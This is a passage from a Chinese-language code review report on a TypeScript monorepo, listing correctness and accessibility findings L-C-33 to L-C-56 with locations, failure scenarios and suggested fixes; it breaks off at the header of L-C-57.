**修复建议**: shutdown 循环内对记录已不存在视为成功 no-op(例如先检查 context.records.has(pluginId),或对 PLG-4001 这类由 shutdown 自身失效引起的诊断降级/过滤),只聚合真实清理失败的诊断。

##### L-C-33 默认 maxBytes(256KB)低于 gateway 契约 schema 允许的 body 上限,契约合法消息在默认配置下不可发送

- **位置**: [`packages/plugin-protocol/src/codec/strictJsonCodec.ts:26`](packages/plugin-protocol/src/codec/strictJsonCodec.ts#L26)
- **类别**: correctness ｜ **置信度**: high ｜ **验证状态**: 已对抗验证 ｜ **审查单元**: pkg-plugin-protocol

**详情**: 核心矛盾真实:schema 请求 body maxLength=262144 恰等于 codec 默认 maxBytes,schema 上限 body 契约校验通过后因 JSON 引号加约 270B envelope 开销必然编码失败(PLG-4020),经 runtime-worker 公共 API 可达。但影响被夸大:内置 network/request 在 dispatch 层先由 measureGatewayJsonValue(min(quota 256KB, contract 192KB)) 拦截,300KB 响应产生干净的 GATEWAY_RESPONSE_INVALID 失败响应,并非静默丢弃/PLG-4025 超时;默认配置下所有内置消息小于等于 192KB 加开销小于 256KB 均可传输,受影响消息(约大于等于 261.9KB)本就会被网关 192KB 策略拒绝,唯一可观察缺陷是误导性的诊断码,故降为 low。

**失败场景**: 插件发 request channel gateway method network/request payload body 为 262144 个 A:契约校验通过,但 envelope 文本 大于 262144 字节,request() 以 PLG-4020 字节上限失败。反方向:Host 网关处理器返回 300KB body(schema 允许到 1MB),handleRequest 到 sendEnvelope 编码失败、响应被静默丢弃且会话不关闭,插件侧请求 5 秒后超时为 PLG-4025,无法区分网络慢与配置矛盾。

**修复建议**: 让默认 codecLimits 与各契约 schema 的最大消息尺寸一致(如默认 maxBytes 提升到覆盖 network/request 响应 1MB 加 envelope 开销),或在 schema 生成期校验 schema 内字符串上限之和不超过默认传输上限,使契约合法即默认可传输成立。

**验证备注**: strictJsonCodec.ts:26 默认 maxBytes=262144;gatewayEnvelopeSchema.generated.ts:471/508 body maxLength 262144/1048576,ajv 按码点放行 262144 字符。protocolEndpoint.ts request() 先契约校验(225)再 sendEnvelope 到 encodeRuntimeEnvelopeV1 套整包字节限(244),开销使 schema 上限 body 编码失败 PLG-4020。

##### L-C-34 well-formed Unicode 检查只作用于传输文本,转义形式的孤立代理项可解码进入协议值

- **位置**: [`packages/plugin-protocol/src/codec/strictJsonCodec.ts:186`](packages/plugin-protocol/src/codec/strictJsonCodec.ts#L186)
- **类别**: correctness ｜ **置信度**: high ｜ **验证状态**: 未验证 ｜ **审查单元**: pkg-plugin-protocol

**详情**: decodeProtocolJsonText 先 isWellFormedUnicode(source) 检查原始文本,再 parse。但 JSON 允许以反斜杠 ud800 转义书写孤立代理项:文本为 6 个 ASCII 字符,通过 well-formed 检查,JSON.parse 生成含孤立代理项的字符串值,inspectJsonValue 只判 typeof string 即放行。encode 侧(JSON.stringify)又会把该值重新转义为反斜杠 ud800 文本并成功编码。于是 README 声称的 codec 拒绝 invalid UTF-8 只对裸字符成立,解码值并不保证 well-formed;且 JS(JSON.parse 保留孤立代理)与 Go encoding/json(将无效代理项转 U+FFFD)对同一报文产生不同值。

**失败场景**: 对端发送 payload 含字符串转义形式 ud800 的 envelope:decode/契约校验全部通过,处理器拿到含孤立代理项的值。若该值随后参与 TextEncoder 编码、规范化 JSON 摘要或跨后端比对,TS 侧按 U+D800(编码为 U+FFFD 字节)处理而 Go 侧按 U+FFFD 处理,同一逻辑值在不同运行时得到不同字节表示/摘要,破坏跨运行时 round-trip 一致性。

**修复建议**: 在 inspectJsonValue 中对字符串值也执行 isWellFormedUnicode 检查(decode 与 encode 对称),拒绝含孤立代理项的值;或在文档中明确仅校验传输文本层,并在跨运行时边界统一将孤立代理项规范化为 U+FFFD。

##### L-C-35 getOriginSummaryId 用 : 拼接且不含 license,不同来源会被误合并导致 license 汇总错报

- **位置**: [`packages/prodivix-compiler/src/export/planner.ts:203`](packages/prodivix-compiler/src/export/planner.ts#L203)
- **类别**: correctness ｜ **置信度**: medium ｜ **验证状态**: 未验证 ｜ **审查单元**: pkg-compiler-export

**详情**: getOriginSummaryId 将 kind/owner/packageName/packageVersion/url/label/contentHash 以 : join(第 203-212 行),license 不在 id 内。其一:url 天然含 :(https://...),字段边界可歧义,如 url https://cdn.example.com 加 label 8080/app.js 与 url https://cdn.example.com:8080 加 label app.js 生成同一 id;其二:仅 license 不同的两个来源(如同一 vendored 标签 three.js 两处 license 元数据不一致)id 相同。ensureOrigin 只保留首个来源的 license,后续仅追加 files。

**失败场景**: 工作区中两个 vendored 文件均标注 label three.js,一份 license MIT、一份 UNSPECIFIED:summarizeOrigins 将二者合并为一个 origin,licenses.json 与 manifest 的 license 汇总只剩先遇到的 MIT,另一份未明确许可的来源从许可审计视图中消失;remote-url 场景下两个不同 URL 的来源也会互串 files 归属。

**修复建议**: 改用不会出现在字段值中的分隔符或对每个字段做 JSON.stringify 后拼接,并将 license 纳入 id(或至少对同 id 不同 license 产生 warning 诊断),避免静默合并。

##### L-C-36 component-instance 事件绑定的 data operation kind 未做编译期校验

- **位置**: [`packages/prodivix-compiler/src/react/documentCompiler.ts:436`](packages/prodivix-compiler/src/react/documentCompiler.ts#L436)
- **类别**: correctness ｜ **置信度**: medium ｜ **验证状态**: 未验证 ｜ **审查单元**: pkg-compiler-react

**详情**: 编译期对 dispatch-data-operation 的 query/mutation kind 校验循环里 if (node.kind 不等于 element) continue,只检查 element 节点 events。而 compileInstance 同样会通过 compileTriggerHandler 把 node.bindings.events 编译成 __pdxRuntime.dispatchTrigger 到 App.dispatchTrigger 到 workspaceDataRuntime.dispatchDataMutation,后者在运行时对 operationKind 不等于 mutation 抛 DATA_MUTATION_OPERATION_UNRESOLVED。element 事件有 PIR_EXPORT_DATA_OPERATION_KIND_MISMATCH 编译诊断,实例事件没有,校验不对称。

**失败场景**: 作者把组件实例的事件绑定指向一个 query 操作,导出编译 status ready 无诊断;运行时点击该组件事件,dispatchDataMutation 抛 DATA_MUTATION_OPERATION_UNRESOLVED,只进 console.error,用户看到点击无反应且导出前毫无提示。

**修复建议**: 把校验循环扩展到 component-instance 节点的 bindings.events(以及 slot outlet 等承载触发器的位置),复用同一组诊断码与消息。

##### L-C-37 resolveNavigateTarget 冒号启发式误杀含 : 的 query/hash 内部导航

- **位置**: [`packages/router/src/routeCore.ts:1013`](packages/router/src/routeCore.ts#L1013)
- **类别**: correctness ｜ **置信度**: high ｜ **验证状态**: 未验证 ｜ **审查单元**: pkg-tokens-router

**详情**: getNavigateLinkKind 已将 ?/# 前缀判为 internal(routeNavigation.ts:9-14),但 resolveNavigateTarget 随后对整串执行 if (rawPath.includes(:) 且 非 rawPath.startsWith(/)) return kind unmatched(1013-1015 行),使所有含 : 的 query/hash 目标被拒;而紧随其后的 resolveRelativeRoutePath(968-970 行)本显式支持 ?/# 前缀,永远走不到。当前仓内 resolveNavigateTarget 无生产调用方(仅 routeCore.test.ts 使用),属公共 API 潜伏缺陷。

**失败场景**: resolveNavigateTarget(m, ctx, to ?time=10:30)、to search?q=a:b 或 to #sec:2 均返回 kind unmatched,本应成功的内部导航被拒绝;只有把 : 编码成 %3A 才能绕过。未来任何接入该 API 的导航入口都会复现。

**修复建议**: 只对第一个 ?/# 之前的 path 部分按 URI scheme 规则判断,如用 scheme 正则测试 pathPart,而不是对整个 rawPath 做 includes(:)。

##### L-C-38 截断响应在多字节边界解码失败,误报 failed 追踪与错误信息

- **位置**: [`packages/runtime-browser/src/browserNetworkAdapter.ts:196`](packages/runtime-browser/src/browserNetworkAdapter.ts#L196)
- **类别**: correctness ｜ **置信度**: high ｜ **验证状态**: 未验证 ｜ **审查单元**: pkg-runtime-browser

**详情**: 第 196 行先 new TextDecoder(utf-8, fatal true).decode(accepted),第 204-208 行才抛超出上限错误。当响应超限且截断点落在多字节 UTF-8 字符中间时 decode 抛错,落入 catch:发布 outcome failed 的 trace(本应为 allowed 加 truncated:true),并把解码器异常包装成通用失败信息。

**失败场景**: responseLimit=4MB,服务返回 4.5MB 中文文本(3 字节/字符,约 2/3 概率切断字符),用户收到 failed trace 与误导性错误(如解码器报 data truncated),而非预期的 allowed 加 truncated 追踪与 exceeded its configured limit 错误。

**修复建议**: 将 if (truncated) throw 提前到 decode 之前(或至少先发布 allowed 加 truncated 的 completedTrace 再抛错);fatal 解码仅用于未截断响应。

##### L-C-39 私网判断的前缀匹配误杀公网域名(fda.gov、fc2.com 等)

- **位置**: [`packages/runtime-browser/src/browserNetworkAdapter.ts:69`](packages/runtime-browser/src/browserNetworkAdapter.ts#L69)
- **类别**: correctness ｜ **置信度**: high ｜ **验证状态**: 未验证 ｜ **审查单元**: pkg-runtime-browser

**详情**: privateHostname 对整个主机名做 startsWith(fc)、startsWith(fd) 与 fe80 类正则。这些规则本意匹配 IPv6 ULA(fc00::/7)与链路本地(fe80::/10)字面量,但同样命中普通 DNS 名称:fda.gov 命中 fd、fc2.com 命中 fc、features.example.com 命中 fea。

**失败场景**: 预览应用 live 请求 https://fda.gov/、https://fc2.com/ 或 https://features.example.com/,被判为私网,抛 Browser Network URL is not safe,合法公网请求被拒绝且无法通过配置修复(除非整体放开私网)。

**修复建议**: 仅当主机名是 IPv6 字面量(含 : 或原以 [ 包裹)时才做 fc/fd/fe80 前缀检查;域名只用精确与后缀规则。

##### L-C-40 持久化 state 事件快照与规范控制器语义不一致(缺 startedAt/cancellationRequestedAt)

- **位置**: [`packages/runtime-remote-postgres/src/postgresExecutionRepository.ts:213`](packages/runtime-remote-postgres/src/postgresExecutionRepository.ts#L213)
- **类别**: correctness ｜ **置信度**: medium ｜ **验证状态**: 未验证 ｜ **审查单元**: pkg-runtime-server

**详情**: stateEvent(193-219 行)用旧行构造快照:queued 到 starting 迁移时同事务 UPDATE 已把 started_at 置为 now,但事件快照因 row.started_at === null 省略 startedAt(213-215 行);且从不写入 cancellationRequestedAt。规范实现 runtime-core/executionJob.ts:286-292 在 starting 事件即写 startedAt、在 cancelling 事件写 cancellationRequestedAt;executionSession.ts:428-432 消费 cancellationRequestedAt 计算 updatedAt。load 返回的 record(startedAt 已置位)与同事务最后一个事件快照自相矛盾。

**失败场景**: 客户端纯靠事件重放远端执行状态:执行处于 starting 期间快照始终无 startedAt;取消后 cancellationRequestedAt 永远缺失,会话投影 updatedAt 回退到 startedAt/createdAt,取消时间线显示错误,事件流与内存实现不一致。

**修复建议**: stateEvent 中对 status===starting 用 now 写入 startedAt(与 UPDATE 一致),对 status===cancelling 写入 cancellationRequestedAt: now,与 runtime-core 控制器对齐。

##### L-C-41 read 结果解码未校验 record.cursor 小于等于 latestCursor,可放过越过最新游标的输出记录

- **位置**: [`packages/runtime-remote/src/remoteExecutionTerminalCodec.ts:266`](packages/runtime-remote/src/remoteExecutionTerminalCodec.ts#L266)
- **类别**: correctness ｜ **置信度**: high ｜ **验证状态**: 未验证 ｜ **审查单元**: pkg-runtime-remote

**详情**: decodeRemoteExecutionTerminalReadResult 的一致性校验只检查 afterCursor 小于等于 nextCursor 小于等于 latestCursor、records 的 cursor 大于 afterCursor 且严格递增(第 266-277 行),未校验单条记录 cursor 小于等于 latestCursor。而合法 broker 的 latestCursor 即 outputCursor,retainedOutputs 的 cursor 永远 小于等于 outputCursor,因此该校验纯属严格解码器应有的防御,却缺失。对称地,worker 侧 decodeRemoteExecutionTerminalWorkerReadResult 对 hasMore/空页组合也未约束,两者同属一类严格性缺口。

**失败场景**: 被劫持或实现错误的 broker 返回 afterCursor 0、nextCursor 5、latestCursor 5、records 含 cursor 9,解码通过;若消费者按记录 cursor 推进读位置,下次 read(afterCursor 9)在 runtime-core 命中 normalizedAfterCursor 大于 outputCursor 抛 RangeError,该会话的终端读取陷入持续报错直至重新 open。

**修复建议**: 在第 269-275 行的 some 条件中追加 output.cursor 大于 result.latestCursor 判据;worker 解码器可补充 hasMore 为 true 时 commands 不得为空的约束。

##### L-C-42 带空白/部分引用的 {token} 值静默通过校验并投影为无效 CSS

- **位置**: [`packages/themes/src/tokens/tokenPaths.ts:189`](packages/themes/src/tokens/tokenPaths.ts#L189)
- **类别**: correctness ｜ **置信度**: medium ｜ **验证状态**: 未验证 ｜ **审查单元**: pkg-plugin-antd-themes

**详情**: extractReferencePath 要求整串匹配花括号包字母数字点下划线连字符,因此花括号内含空格的引用、带尾随换行的引用或 1px solid {semantic.border.default} 都不被识别为引用。validateThemeManifest 对 token 值只做类型检查,对这种引用形态但匹配失败的字符串没有任何诊断;createCssVariables.ts:41-49 的 createCssValue 走 return String(value) 原样输出。结果是校验闸门判定合法、CSS 投影产出含花括号的自定义属性值,在 var() 使用处 invalid-at-computed-value-time,样式静默回退到 unset/initial。

**失败场景**: 自定义主题写 semantic.border.default 引用带空格的 palette.gray.13,validateThemeManifest 返回 valid true 无错误,createThemeStyleText 输出 --border-default 含花括号原文,所有 border-color: var(--border-default) 的元素边框色失效且无任何诊断,作者拿到的是一份校验通过的坏主题。

**修复建议**: 在 validateThemeManifest(或 validateTokenTree)中对包含花括号但 extractReferencePath 匹配失败的字符串值报错(例如非法的 token 引用语法),使引用语法错误 fail closed;或者在解析/投影侧对花括号值统一视为非法引用并给出诊断。

##### L-C-43 PdxCard 用 div 模拟按钮时 Space 键在 keydown 触发 click,长按会重复执行 onClick

- **位置**: [`packages/ui/src/container/PdxCard.tsx:45`](packages/ui/src/container/PdxCard.tsx#L45)
- **类别**: correctness ｜ **置信度**: medium ｜ **验证状态**: 未验证 ｜ **审查单元**: pkg-ui-container

**详情**: handleKeyDown 对 Enter 与 空格(第 45 行)统一 preventDefault 后调用 event.currentTarget.click()(第 48 行)。原生 button 对 Space 是在 keyup 激活且不随自动重复触发;此处在 keydown 激活,操作系统对按住不放会产生 keydown 自动重复,每次重复都合成一次 click 并调用 onClick。

**失败场景**: 可点击 Card 绑定非幂等操作(如添加节点、发送提案),用户按住空格键(或粘滞键/辅助功能重复键),onClick 被连续多次调用,产生重复添加/重复提交;Enter 长按同理。

**修复建议**: 将 Space 的激活移到 keyup 处理(并校验 target 未变),或在 keydown 中对 Space 记录标记、忽略 event.repeat 的重复事件,使行为与原生 button 对齐。

##### L-C-44 PdxPanel collapsible 但缺少 title 时无折叠控件,内容可被永久隐藏

- **位置**: [`packages/ui/src/container/PdxPanel.tsx:68`](packages/ui/src/container/PdxPanel.tsx#L68)
- **类别**: correctness ｜ **置信度**: high ｜ **验证状态**: 未验证 ｜ **审查单元**: pkg-ui-container

**详情**: 折叠按钮仅在 title 且 collapsible 时渲染(第 68 行),纯标题头在 title 且 非 collapsible 时渲染(第 84 行);而 hidden={isCollapsed}(第 89 行)对 collapsible 恒生效。因此 PdxPanel collapsible defaultCollapsed 不带 title 时:无切换按钮、无键盘入口,非受控模式下 isCollapsed 永远为 true,children 永久不可见,且无任何开发期告警。

**失败场景**: 消费方重构时删掉 title 但保留 collapsible 加 defaultCollapsed,面板内容从页面上彻底消失且无法展开,表现为内容丢失;若 collapsed 受控但父级未提供其他切换 UI,同样不可操作。

**修复建议**: 要么在无 title 且 collapsible 时提供默认折叠控件/aria-label,要么在开发期对 collapsible 且 非 title 组合发出警告,或将 title 设为 collapsible 的必需项(类型层面区分)。

##### L-C-45 PdxSection 静默丢弃 PdxComponent 契约中的 onClick(与 as)

- **位置**: [`packages/ui/src/container/PdxSection.tsx:28`](packages/ui/src/container/PdxSection.tsx#L28)
- **类别**: correctness ｜ **置信度**: high ｜ **验证状态**: 已对抗验证 ｜ **审查单元**: pkg-ui-container

**详情**: 类型契约与运行时不一致属实:PdxSectionProps extends PdxComponent 使 onClick/as 通过 TS 检查,但组件解构(L17-28)与 section(L34-43)均未消费,且因未透传到 DOM 而无任何告警,对比 PdxText/PdxDiv/PdxCard 均支持。修正:全仓当前无调用方传 onClick/as,失败场景为潜伏触发(未来调用方)而非现存缺陷,影响面限于 API 卫生,建议降为 low。

**失败场景**: 调用方 PdxSection 带 onClick 导航(TS 编译通过),点击 section 无任何响应,消费方误以为事件系统故障而长时间排查;传 as=nav 也被静默忽略,语义化标签诉求落空。

**修复建议**: 解构 onClick 并绑定到 section onClick;若决定不支持交互,应从该组件 props 类型中 Omit 掉 onClick/as,避免类型契约与运行时不符。

**验证备注**: PdxComponent.ts L8-9 确声明可选 onClick/as;PdxSection.tsx L14-15 extends 之,但 L17-28 解构未取 onClick/as,L32 dataProps 仅复制 dataAttributes,L35-43 section 无 onClick 绑定也无 as 多态——因属性在解构处被丢弃,连 React unknown-prop 告警都不会有,静默丢弃属实。对照 PdxText 同时支持 as 加 onClick。

##### L-C-46 PdxList 用数组 index 作 key,排序/过滤后行状态错位

- **位置**: [`packages/ui/src/data/PdxList.tsx:44`](packages/ui/src/data/PdxList.tsx#L44)
- **类别**: correctness ｜ **置信度**: medium ｜ **验证状态**: 未验证 ｜ **审查单元**: pkg-ui-data

**详情**: 第 43-44 行 items.map((item, index) 渲染 li key={index})。PdxListItem 无稳定 id,组件也未提供 key 提取函数,而 renderItem/extra 允许渲染任意带局部状态的内容。按 index 作 key 时,React 按位置复用 DOM 而非按行身份迁移。

**失败场景**: 父组件对 items 排序或过滤:如 renderItem 返回含 input defaultValue={item.title} 或焦点元素,删除/排序首项后,位置 0 的 li 被复用给原第 2 项,输入框保留上一行的已键入文本、焦点附着到错误行,呈现数据与行内容错位。

**修复建议**: 为 PdxListItem 增加可选 id/key 字段或提供 rowKey prop,默认回退 index 但允许消费方传入稳定键。

##### L-C-47 disabled 提前返回导致 trigger 子树重挂载并丢弃包装属性与布局

- **位置**: [`packages/ui/src/feedback/PdxTooltip.tsx:49`](packages/ui/src/feedback/PdxTooltip.tsx#L49)
- **类别**: correctness ｜ **置信度**: high ｜ **验证状态**: 未验证 ｜ **审查单元**: pkg-ui-nav-fb

**详情**: 第 49 行 if (disabled) return children 直接返回裸子元素;而 enabled 时渲染树为 span class PdxTooltip 包 Provider/Root/Trigger asChild 包 child(第 64-82 行),根节点是 span。disabled 切换时该位置的根节点类型由 span 变为子元素自身,React 协调会整体卸载旧子树并重新挂载 children,而非复用 DOM 节点;同时包装 span 上的 className/id/style/dataAttributes 以及 .PdxTooltip display inline-flex 布局一并消失。

**失败场景**: PdxTooltip disabled={isTouch} 包 button:用户用键盘聚焦该按钮后,isTouch 因指针/触摸探测变化而切为 true,按钮 DOM 节点被重挂载,焦点丢失回 body,键盘用户必须重新 Tab;若子元素是带内部状态的组件(展开中的下拉等)状态被清零,同时 inline-flex 包装消失造成布局跳动。

**修复建议**: 保持渲染树结构稳定:始终渲染包装 span 与 Radix 树,disabled 时改用 TooltipPrimitive.Root open 强制关闭(disabled 时 false),而不是 early return,使切换 disabled 不改变 DOM 节点身份与布局,wrapper 上的 id/className/dataAttributes 也保持生效。

##### L-C-48 字数统计基于原始 HTML,实体未解码导致字符数虚高

- **位置**: [`packages/ui/src/form/PdxRichTextEditor.tsx:178`](packages/ui/src/form/PdxRichTextEditor.tsx#L178)
- **类别**: correctness ｜ **置信度**: high ｜ **验证状态**: 未验证 ｜ **审查单元**: pkg-ui-form

**详情**: const characterCount, wordCount 取自 getVisibleTextMetrics(currentValue),其中 currentValue 是 HTML 字符串;getVisibleTextMetrics 到 stripHtmlTags 只剥离标签,不解码 HTML 实体。contentEditable 序列化会把用户输入的 &/小于/大于 转成 &amp;/&lt;/&gt;,粘贴内容常含 &nbsp;,这些实体会被逐字符计入。

**失败场景**: 用户在编辑器中输入 5 大于 3,innerHTML 为 5 &gt; 3,底部 aria-live 区域读出 9 chars 而可见文本只有 5 个字符;输入 A & B 显示 9 chars。对字符数有限制的表单(如评论上限)会给出与实际不符的反馈。

**修复建议**: 对剥离标签后的文本做实体解码(复用 shared/safety 的 decodeHtmlEntities 思路),或直接基于 editorRef.current.textContent 计算可见文本度量。

##### L-C-49 range input 无可访问名称:label 未关联、控件无 id/aria-label

- **位置**: [`packages/ui/src/form/PdxSlider.tsx:83`](packages/ui/src/form/PdxSlider.tsx#L83)
- **类别**: correctness ｜ **置信度**: high ｜ **验证状态**: 未验证 ｜ **审查单元**: pkg-ui-form

**详情**: 第 78 行 label class PdxFieldLabel 没有 htmlFor,第 83-97 行 input class PdxSliderInput type range 既无 id 也无 aria-label,label 与控件之间没有任何程序化关联(视觉上有标签,AT 下控件无名)。同类问题:PdxPasswordStrength 的 input(第 91 行)、PdxVerificationCode 的 6 个 input(第 128 行)、PdxRegionPicker 的 3 个 select(第 140/153/166 行)均无关联标签。仓库已有正确范式(PdxColorPicker/PdxRange 经 usePdxFieldIds 绑定 controlId)。

**失败场景**: 屏幕阅读器用户 Tab 到该滑块只听到 滑块, 50 而不知是哪个字段;点击可见 label 也不会聚焦控件;读屏按标签导航表单时定位不到该控件。

**修复建议**: 统一改用 PdxField 加 usePdxFieldIds 模式(为控件生成 controlId 并给 label 设 htmlFor),或至少给 input 补 aria-label={label}。

##### L-C-50 onComplete 在完整态下的每次修改都重复触发,易引发自动提交重入

- **位置**: [`packages/ui/src/form/PdxVerificationCode.tsx:69`](packages/ui/src/form/PdxVerificationCode.tsx#L69)
- **类别**: correctness ｜ **置信度**: medium ｜ **验证状态**: 未验证 ｜ **审查单元**: pkg-ui-form

**详情**: updateValue 中 if (onComplete 且 nextChars.every(char 非空)) onComplete(nextValue) 只判断改完后是否完整,不判断之前是否已完整。handleChange 与 handlePaste 都会走到这里,因此验证码在已填满后被修改任意一位,都会再次触发 onComplete。OTP 场景最常见的消费方式就是在 onComplete 里直接发起校验请求。

**失败场景**: 用户粘贴 6 位码,onComplete 触发第一次校验;用户发现第 3 位错了,改写该位(值依然 6 位齐全),onComplete 立刻第二次触发,两次校验请求在途,可能撞限流计数或出现过期响应覆盖新结果。

**修复建议**: 记录上一次是否已完整(用 ref 保存 prevComplete),仅在 incomplete 到 complete 的迁移瞬间调用 onComplete;修改完整值时只走 onChange。

##### L-C-51 PdxImageGallery 对超出 maxSelection 的受控选中静默截断,父级状态与 UI 分歧

- **位置**: [`packages/ui/src/image/PdxImageGallery.tsx:69`](packages/ui/src/image/PdxImageGallery.tsx#L69)
- **类别**: correctness ｜ **置信度**: medium ｜ **验证状态**: 未验证 ｜ **审查单元**: pkg-ui-container

**详情**: selectedIndices 归一化为去重后 filter 越界再 slice(0, selectionLimit)(第 67-69 行),截断只作用于渲染,从不调用 onSelectionChange 通知父级。受控模式下父级传入的超限索引在 UI 上被隐藏为未选中,但父级状态未变;用户一旦点击某项,handleImageClick(第 99-103 行)以归一化数组为基线回传,超限索引被静默抹除。

**失败场景**: 父级 PdxImageGallery selectable maxSelection 2 selectedIndices 0,1,2,界面仅显示 0、1 选中,父级(如批量操作栏)仍按 3 张选中计数;用户取消勾选 0,onSelectionChange([1]),索引 2 无任何通知即从选择集中消失,父级此前基于 2 的业务状态被组件悄悄改写。

**修复建议**: 将超限视为输入校验问题:渲染按截断显示的同时,在检测到 raw 值与归一化值不一致时通过 onSelectionChange 回传归一化结果(或在文档/类型层面约定调用方保证不超限),避免单向静默改写。

##### L-C-52 PdxSearch 在 IME 输入法组合态按 Enter 会误触发 onSearch

- **位置**: [`packages/ui/src/input/PdxSearch.tsx:100`](packages/ui/src/input/PdxSearch.tsx#L100)
- **类别**: correctness ｜ **置信度**: medium ｜ **验证状态**: 已对抗验证 ｜ **审查单元**: pkg-ui-container

**详情**: 机制属实但当前可达性有限:唯一应用调用方 I18nResourcePanels 仅用 onValueChange、未传 onSearch,故产品现网路径无误触发;onSearch 误触发路径目前仅见于 stories 及未来消费点,属库级潜伏缺陷,应降级 low。

**失败场景**: 用户用拼音输入 北京,按 Enter 提交候选词,keydown 的 key 为 Enter 且 isComposing=true,onSearch 以尚未提交的原始串(如拼音 beijing 或带下划线的组合文本)触发一次错误搜索,随后组合提交又可能再次触发,搜索结果闪烁/埋点污染。

**修复建议**: 在 Enter 分支开头加 if (event.nativeEvent.isComposing) return(或兼容 keyCode === 229),组合态下不触发 onSearch。

**验证备注**: 已读 PdxSearch.tsx 第 99-104 行:onKeyDown 仅判 event.key===Enter 且 非 event.defaultPrevented 即调 onSearch?.(currentValue),全仓 packages/ui/src 无 isComposing/229 防护。IME 组合中按 Enter 提交候选,浏览器派发 key=Enter、isComposing=true 且非 defaultPrevented 的 keydown。

##### L-C-53 dataAttributes 末位展开可覆盖组件计算的 data-route-* 且未过滤

- **位置**: [`packages/ui/src/nav/PdxRoute.tsx:93`](packages/ui/src/nav/PdxRoute.tsx#L93)
- **类别**: correctness ｜ **置信度**: medium ｜ **验证状态**: 未验证 ｜ **审查单元**: pkg-ui-nav-fb

**详情**: 第 93 行 dataAttributes 展开 位于组件计算的 data-route-scope/module-id/node-id/projected-path(第 89-92 行)之后且未经 foundation/component 的 getDataAttributes 过滤(与同目录 PdxTabs/PdxCollapse/PdxNav 及 feedback 各组件的写法不一致):同名键会静默覆盖组件语义属性;不带 data- 前缀的键会原样成为 DOM 属性并触发 React 开发告警。PdxOutlet(第 24 行)、PdxSidebar(第 46 行)、PdxAnchorNavigation(第 38 行)、PdxBreadcrumb(第 35 行)存在同样的未过滤裸展开。

**失败场景**: 调用方传 dataAttributes 含 data-route-projected-path /x,DOM 上的投影路径属性与实际 projection.path 不符,依赖该属性做断言的 E2E 或 CSS 属性选择器产生假阳性/假阴性;传 foo bar 则渲染出非法属性 foo=bar 并在控制台产生 React 告警。

**修复建议**: 统一改为先 getDataAttributes(dataAttributes) 展开 再写组件计算的 data-route-* 属性(保证组件语义属性不被覆盖),并过滤非 data- 前缀键;PdxOutlet/PdxSidebar/PdxAnchorNavigation/PdxBreadcrumb 同样对齐 foundation/component 的实现。

##### L-C-54 折叠态首字截取用 slice(0,1) 会切断代理对显示乱码

- **位置**: [`packages/ui/src/nav/PdxSidebar.tsx:59`](packages/ui/src/nav/PdxSidebar.tsx#L59)
- **类别**: correctness ｜ **置信度**: medium ｜ **验证状态**: 未验证 ｜ **审查单元**: pkg-ui-nav-fb

**详情**: 第 59 行 collapsed 时 title.slice(0, 1) 否则 title 与第 86 行 item.label.slice(0, 1) 按 UTF-16 code unit 取首字符。对 emoji 等增补平面字符(代理对)只取到一半孤立代理,渲染为乱码方块;第 55 行折叠态 aria-label 虽用完整 title,但视觉首字与朗读内容不一致。

**失败场景**: 侧边栏 title 或某 item.label 以 emoji 开头(如 🚀 Launch),collapsed=true 时 PdxSidebarTitle / PdxSidebarFallbackIcon 显示半个代理对的乱码字符;用户看到的是不可读字形而非预期的 🚀。

**修复建议**: 改用码点安全截取:const firstChar = Array.from(title)[0] 或空(或 [...title][0]),title 与 label 两处同样处理。

##### L-C-55 非选中 tab 的 aria-controls 指向 DOM 中不存在的 panel ID

- **位置**: [`packages/ui/src/nav/PdxTabs.tsx:138`](packages/ui/src/nav/PdxTabs.tsx#L138)
- **类别**: correctness ｜ **置信度**: high ｜ **验证状态**: 未验证 ｜ **审查单元**: pkg-ui-nav-fb

**详情**: 第 138 行每个 tab 都设置 aria-controls 为 baseId-panel-index,但第 159-169 行只挂载唯一选中 panel,其 id 为 panel-selectedIndex。因此 N 个 tab 中有 N-1 个的 aria-controls 是悬空 IDREF(指向从不渲染的元素),辅助技术沿非选中 tab 的 aria-controls 跳转时找不到 tabpanel;aria-labelledby(第 161 行)只对选中项成立。

**失败场景**: 渲染 3 个 tab 且默认选中第一个:屏幕阅读器用户聚焦索引 2 的 Details tab,其 aria-controls 指向 baseId-panel-2,而 DOM 中只有 baseId-panel-0,跳转/关联失败;axe 等无障碍检查会报 aria-controls 引用不存在的元素。

**修复建议**: 二选一:仅对选中 tab 设置 aria-controls(值为 panel-selectedIndex);或按 ARIA APG 推荐做法始终挂载全部 panel、对未选中 panel 加 hidden 属性,使每个 tab 的 aria-controls 都能解析到真实元素,同时保留 AT 对 panel 内容的可访问性。

##### L-C-56 外部适配器重复绑定同一引用时生成幂等性空操作事务

- **位置**: [`packages/workspace/src/authoring/workspaceExternalAdapter.ts:427`](packages/workspace/src/authoring/workspaceExternalAdapter.ts#L427)
- **类别**: correctness ｜ **置信度**: medium ｜ **验证状态**: 未验证 ｜ **审查单元**: pkg-ws-core

**详情**: createWorkspaceExternalAdapterBindingTransactionPlan 不像 auth 配置规划器(workspaceServerRuntimeAuthConfiguration.ts 第 152-157 行有 JSON 相等短路)那样比较新旧绑定:updateBindingValue(第 415-419 行)总是生成结构相等的新 value,createWorkspaceProjectConfigValueUpdateCommand(workspaceResourceDocument.ts 第 208-243 行)没有 no-op 判等,无条件产出 replace /value 命令;artifact 侧 createWorkspaceCodeContentUpdateCommand 因内容相同返回 null,于是 commands 只剩一条值相等的 config 命令,仍返回 status ready。

**失败场景**: 用户对已绑定同一 artifact/export 的外部库再次点击 Bind,生成并记录一条值完全相等的 config replace 事务,History 出现可撤销的空条目,Outbox/Atomic Commit 照常提交使 opSeq 空转;多次重复点击累积无意义的修订与历史噪声。

**修复建议**: 在规划器中对 updateBindingValue 的结果与当前 config value 做深度判等(JSON.stringify 或 valuesEqual),相等且 artifact 命令为 null 时返回 status unchanged;或在 createWorkspaceProjectConfigValueUpdateCommand 中加入值相等返回 null 的守卫。

##### L-C-57 build 任务 env 未声明 VITE_API_BASE / VITE_PLUGIN_SANDBOX_URL,导致 turbo 缓存失效遗漏

- **位置**: [`turbo.json:6`](turbo.json#L6)
- **类别**: correctness ｜ **置信度**: medium ｜ **验证状态**: 未验证 ｜ **审查单元**: infra-scripts

